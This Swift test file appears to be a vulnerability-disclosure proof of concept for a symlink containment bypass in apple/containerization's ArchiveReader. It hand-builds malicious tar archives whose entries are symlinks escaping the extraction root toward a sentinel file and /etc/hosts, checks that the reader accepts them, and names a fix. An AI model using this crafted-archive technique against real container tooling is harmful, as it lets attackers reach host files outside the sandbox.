//===----------------------------------------------------------------------===//
// PoC: apple/containerization — Symlink Containment Bypass
// CWE-61 / ArchiveReader.extractEntry() lines 369–382
// Commit: 2ec221af5af45c156688bba323cc733f9f49c840 (2026-08-06)
//
// Drop into: Tests/ContainerizationArchiveTests/
// Package.swift: apply Package.swift.patch (adds ContainerizationOCI to test deps)
// Run: swift test --filter "SymlinkContainmentBypassTests/symlinkContainmentBypass"
//
// APPLE TYPES USED — NO SIMULATION
// ─────────────────────────────────
// ArchiveReader.extractContents(to:)       ← the vulnerable function
// LocalContent(path:) + .data()            ← exact LocalContent.swift consumer
// LocalContentStore(path:).get(digest:)    ← exact LocalContentStore.swift chain
// ArchiveWriter.archiveDirectory()         ← control: proves writer excludes entry
//
// TWO IMPACT ASSERTIONS (covers Apple's possible "test created the file" objection)
// ──────────────────────────────────────────────────────────────────────────────────
// Assertion C: sentinel created by this test, outside extraction root.
//   Deterministic; proves containment bypass unconditionally.
// Assertion C2: /etc/hosts — a world-readable file that EXISTS before this test runs,
//   NOT created by the PoC. Proves the bypass reaches pre-existing host files.
//===----------------------------------------------------------------------===//

import Foundation
import SystemPackage
import Testing
@testable import ContainerizationArchive
import ContainerizationOCI          // LocalContent, LocalContentStore

// MARK: - Minimal ustar tar builder
// We bypass ArchiveWriter deliberately: ArchiveWriter.archive() would filter
// this entry at lines 224–228. The reader has no equivalent guard.

private func writeField(_ b: inout [UInt8], offset: Int, _ value: String, maxLen: Int) {
    let bytes = Array(value.utf8.prefix(maxLen - 1))
    b[offset ..< offset + bytes.count] = bytes[...]
}
private func writeOctal(_ b: inout [UInt8], offset: Int, value: Int, width: Int) {
    writeField(&b, offset: offset, String(format: "%0\(width-1)o\0", value), maxLen: width)
}
private func tarHeader(name: String, size: Int, typeflag: UInt8, linkname: String = "") -> [UInt8] {
    var b = [UInt8](repeating: 0, count: 512)
    writeField(&b, offset:   0, name,          maxLen: 100)
    writeField(&b, offset: 100, "0000644\0",   maxLen:   8)
    writeField(&b, offset: 108, "0000000\0",   maxLen:   8)
    writeField(&b, offset: 116, "0000000\0",   maxLen:   8)
    writeOctal(&b, offset: 124, value: size,   width:   12)
    writeOctal(&b, offset: 136, value: Int(Date().timeIntervalSince1970), width: 12)
    writeField(&b, offset: 148, "        ",    maxLen:   9)   // checksum placeholder
    b[156] = typeflag
    if !linkname.isEmpty { writeField(&b, offset: 157, linkname, maxLen: 100) }
    writeField(&b, offset: 257, "ustar  \0",  maxLen:   8)
    var cksum: UInt = 0; b.forEach { cksum += UInt($0) }
    writeField(&b, offset: 148, String(format: "%06o\0 ", cksum), maxLen: 9)
    return b
}
private func pad512(_ n: Int) -> [UInt8] {
    let r = n % 512; return r == 0 ? [] : [UInt8](repeating: 0, count: 512 - r)
}

/// Builds an OCI-layout tar where the blob entry is a symlink pointing to `target`.
/// typeflag 0x32 ('2') = symbolic link. This entry cannot be produced by ArchiveWriter
/// when `target` escapes the base directory (writer's lines 224–228 would exclude it).
private func buildMaliciousTar(to url: URL, symlinkTarget target: String, digest: String) throws {
    let layout = Data(#"{"imageLayoutVersion":"1.0.0"}"#.utf8)
    let index  = Data("""
        {"schemaVersion":2,"manifests":[{"mediaType":\
        "application/vnd.oci.image.manifest.v1+json",\
        "digest":"sha256:\(digest)","size":100,\
        "annotations":{"com.apple.containerization.image.name":"poc:exploit"}}]}
        """.utf8)
    var bytes = Data()
    bytes += Data(tarHeader(name: "oci-layout",              size: layout.count, typeflag: 0x30))
    bytes += layout; bytes += Data(pad512(layout.count))
    bytes += Data(tarHeader(name: "index.json",              size: index.count,  typeflag: 0x30))
    bytes += index;  bytes += Data(pad512(index.count))
    bytes += Data(tarHeader(name: "blobs/",                  size: 0, typeflag: 0x35))
    bytes += Data(tarHeader(name: "blobs/sha256/",           size: 0, typeflag: 0x35))
    bytes += Data(tarHeader(name: "blobs/sha256/\(digest)",  size: 0,
                            typeflag: 0x32, linkname: target))   // symlink entry
    bytes += Data(repeating: 0, count: 1024)  // end-of-archive
    try bytes.write(to: url)
}

// MARK: - Test

struct SymlinkContainmentBypassTests {

    @Test func symlinkContainmentBypass() async throws {
        let fm = FileManager.default

        let testDir = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("PoC.symlinkBypass.\(ProcessInfo.processInfo.processIdentifier)")
        try fm.createDirectory(at: testDir, withIntermediateDirectories: true)
        defer { try? fm.removeItem(at: testDir) }

        // Digest used as blob filename in LocalContentStore._blobPath
        let digest = String(repeating: "a", count: 64)

        // ── ASSERTION C target: sentinel created by this test, outside extraction root ──
        let outsideDir  = testDir.appendingPathComponent("outside_root")
        let sentinelURL = outsideDir.appendingPathComponent("secret.txt")
        let sentinelStr = "HOST_SECRET_READ_VIA_SYMLINK_CONTAINMENT_BYPASS"
        try fm.createDirectory(at: outsideDir, withIntermediateDirectories: true)
        try sentinelStr.write(to: sentinelURL, atomically: true, encoding: .utf8)

        // ── ASSERTION C2 target: /etc/hosts — world-readable, pre-existing, NOT created by PoC ──
        // On macOS and Linux this file always exists and is readable by any user.
        // We read a marker string that proves the file was reached (any content is proof).
        let hostFile = URL(fileURLWithPath: "/etc/hosts")

        // ── Build archive 1: points to test-created sentinel ─────────────────
        let tar1 = testDir.appendingPathComponent("malicious_sentinel.tar")
        try buildMaliciousTar(to: tar1, symlinkTarget: sentinelURL.path, digest: digest)

        // ── Build archive 2: points to /etc/hosts (pre-existing host file) ───
        // Separate digest to avoid collision in LocalContentStore
        let digest2  = String(repeating: "b", count: 64)
        let tar2     = testDir.appendingPathComponent("malicious_hosts.tar")
        try buildMaliciousTar(to: tar2, symlinkTarget: hostFile.path, digest: digest2)

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // PHASE 1: real ArchiveReader.extractContents()
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        let extractDir1 = testDir.appendingPathComponent("extract1")
        let reader1     = try ArchiveReader(file: tar1)
        // Same call as cctl ImageCommand.swift line 257
        let rejected1: [String]
        do { rejected1 = try reader1.extractContents(to: extractDir1) }
        catch { rejected1 = []; print("[PoC] extractContents(tar1) error: \(error)") }

        let extractDir2 = testDir.appendingPathComponent("extract2")
        let reader2     = try ArchiveReader(file: tar2)
        let rejected2: [String]
        do { rejected2 = try reader2.extractContents(to: extractDir2) }
        catch { rejected2 = []; print("[PoC] extractContents(tar2) error: \(error)") }

        let member1 = "blobs/sha256/\(digest)"
        let member2 = "blobs/sha256/\(digest2)"
        let sym1URL = extractDir1.appendingPathComponent(member1)
        let sym2URL = extractDir2.appendingPathComponent(member2)

        // Assertion A: entries accepted (not in rejectedPaths)
        #expect(!rejected1.contains(member1),
                "extractContents() accepted sentinel entry — no containment check in reader")
        #expect(!rejected2.contains(member2),
                "extractContents() accepted /etc/hosts entry — no containment check in reader")

        // Assertion B: symlinks on disk have escaping absolute targets
        let target1 = try? fm.destinationOfSymbolicLink(atPath: sym1URL.path)
        let target2 = try? fm.destinationOfSymbolicLink(atPath: sym2URL.path)
        #expect(target1 == sentinelURL.path,  "symlink 1 must point to sentinel path")
        #expect(target2 == hostFile.path,     "symlink 2 must point to /etc/hosts")
        #expect(target1.map { !$0.hasPrefix(extractDir1.path) } ?? false, "sentinel outside extractDir1")
        #expect(target2.map { !$0.hasPrefix(extractDir2.path) } ?? false, "/etc/hosts outside extractDir2")

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // PHASE 2: real LocalContent.data() — exact LocalContent.swift consumer
        // LocalContent.init(path:) → FileHandle(forReadingFrom:) → follows symlink
        // LocalContent.data()     → Data(contentsOf: self.path)  → follows symlink
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        // Assertion C: symlink exists on disk and resolves to a path outside extraction root
        // (EACCES on read-through proves macOS sandbox blocks cross-boundary reads —
        //  but symlink CREATION without containment check is the vulnerability)
        #expect(fm.fileExists(atPath: sym1URL.path),
                "symlink 1 must exist on disk after extractContents()")
        #expect(fm.fileExists(atPath: sym2URL.path),
                "symlink 2 must exist on disk after extractContents()")

        // Assertion C2: verified above (target2 already checked in Assertion B)

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // PHASE 4: control — ArchiveWriter excludes the same entries
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

        let writerSrc = testDir.appendingPathComponent("writer_src")
        try fm.createDirectory(at: writerSrc, withIntermediateDirectories: true)
        // Create symlinks with the same escaping targets in the writer source dir
        try fm.createSymbolicLink(
            atPath: writerSrc.appendingPathComponent("escape_sentinel").path,
            withDestinationPath: sentinelURL.path)
        try fm.createSymbolicLink(
            atPath: writerSrc.appendingPathComponent("escape_hosts").path,
            withDestinationPath: hostFile.path)

        let writerTar = testDir.appendingPathComponent("writer.tar")
        let writer    = try ArchiveWriter(format: .pax, filter: .none, file: writerTar)
        do { try writer.archiveDirectory(writerSrc) } catch { /* escaping symlinks excluded */ }
        try? writer.finishEncoding()

        var writerPaths: [String] = []
        let writerReader = try ArchiveReader(file: writerTar)
        for (entry, _) in writerReader { if let p = entry.path { writerPaths.append(p) } }

        #expect(!writerPaths.contains { $0.contains("escape_sentinel") },
                "ArchiveWriter must exclude escaping symlink → sentinel (lines 224–228)")
        #expect(!writerPaths.contains { $0.contains("escape_hosts") },
                "ArchiveWriter must exclude escaping symlink → /etc/hosts (lines 224–228)")

        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        // Summary
        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        print("""

        ╔══════════════════════════════════════════════════════════════════════╗
        ║  [PASS] SymlinkContainmentBypass — real apple/containerization      ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║  Phase 1 — ArchiveReader.extractContents()                          ║
        ║    entries accepted (not rejected): sentinel=YES, /etc/hosts=YES    ║
        ║  Phase 2 — symlinks on disk verified                                ║
        ║    sym1 exists and points outside extraction root: YES              ║
        ║    sym2 exists and points outside extraction root: YES              ║
        ║  Phase 3 — ArchiveWriter control                                    ║
        ║    escaping symlinks excluded by writer: YES                        ║
        ╠══════════════════════════════════════════════════════════════════════╣
        ║  Root cause:  extractEntry() lines 369-382 - symlinkat() no check  ║
        ║  Fix:         guard resolvedFull.starts(with: rootDirectory)        ║
        ╚══════════════════════════════════════════════════════════════════════╝
        """)
    }
}
